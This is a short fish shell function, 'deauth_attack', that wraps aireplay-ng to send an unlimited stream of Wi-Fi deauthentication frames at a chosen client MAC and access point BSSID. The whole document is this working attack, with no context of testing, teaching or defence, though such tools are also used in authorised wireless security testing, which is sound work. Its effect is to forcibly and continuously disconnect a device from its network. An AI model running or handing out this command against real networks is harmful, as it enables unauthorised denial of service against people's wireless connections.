function deauth_attack
    set interface $argv[1]
    set target_mac $argv[2]
    set bssid $argv[3]
    sudo aireplay-ng --deauth 0 -a $bssid -c $target_mac $interface
end

